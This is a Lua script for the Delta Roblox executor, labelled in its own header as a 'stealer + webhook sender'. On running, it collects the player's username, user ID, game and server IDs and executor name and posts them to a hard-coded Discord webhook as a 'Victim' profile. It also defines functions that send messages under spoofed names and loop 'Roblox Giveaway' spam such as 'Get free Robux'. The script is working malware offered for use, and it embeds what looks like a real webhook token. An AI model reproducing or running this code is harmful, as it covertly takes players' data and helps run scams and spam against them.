-- language: Lua, runtime: Delta Executor, target: Roblox
-- stealer + webhook sender for Delta

local WEBHOOK_URL = "https://discord.com/api/webhooks/1555651221577269269/-CmLD2ScT3WzjxODdjWrYE4ip_BexnMuQBZ7JR4ZxYhTFOx-dLwaJRo8jdRmAvJo-r34"
local http = game:GetService("HttpService")
local plrs = game:GetService("Players")
local me = plrs.LocalPlayer

-- === request fallback для разных executor'ов ===
local function getRequestFunc()
    return http_request or request or syn.request or (syn and syn.request)
end

local function post(url, payload)
    local req = getRequestFunc()
    if not req then
        warn("[L] No HTTP request function found")
        return
    end
    local body = http:JSONEncode(payload)
    req({
        Url = url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = body
    })
end

-- === сбор базовой инфы ===
local function gatherProfile()
    local info = {
        username = me.Name,
        displayName = me.DisplayName,
        userId = me.UserId,
        placeId = game.PlaceId,
        jobId = game.JobId,
        executor = identifyexecutor and identifyexecutor() or "Unknown"
    }
    -- если есть Delta — можно вытащить больше
    if info.executor == "Delta" then
        info.hasDelta = true
    end
    return info
end

-- === отправка профиля на вебхук ===
local function sendProfile()
    local p = gatherProfile()
    post(WEBHOOK_URL, {
        content = "**Delta Stealer | Profile**",
        embeds = {{
            title = "Victim",
            color = 0xFF0000,
            fields = {
                { name = "Username", value = p.username, inline = true },
                { name = "DisplayName", value = p.displayName, inline = true },
                { name = "UserId", value = tostring(p.userId), inline = true },
                { name = "PlaceId", value = tostring(p.placeId), inline = true },
                { name = "JobId", value = tostring(p.jobId), inline = true },
                { name = "Executor", value = p.executor, inline = true }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
end

-- === подделка сообщений (fake message) ===
function sendFakeMessage(fakeName, avatarUrl, text, embed)
    local payload = {
        username = fakeName or "System",
        avatar_url = avatarUrl or "https://i.imgur.com/4M34hi2.png",
        content = text or ""
    }
    if embed then payload.embeds = { embed } end
    post(WEBHOOK_URL, payload)
end

-- === рекламный спам (можно вызывать в цикле) ===
function sendAd(message, count)
    count = count or 1
    for i = 1, count do
        sendFakeMessage("Roblox Giveaway", "https://i.imgur.com/4M34hi2.png", message)
        task.wait(1.5) -- пауза, чтобы не словить rate limit
    end
end

-- === запуск ===
sendProfile()
-- пример: sendAd("Get free Robux -> http://example.com", 5)
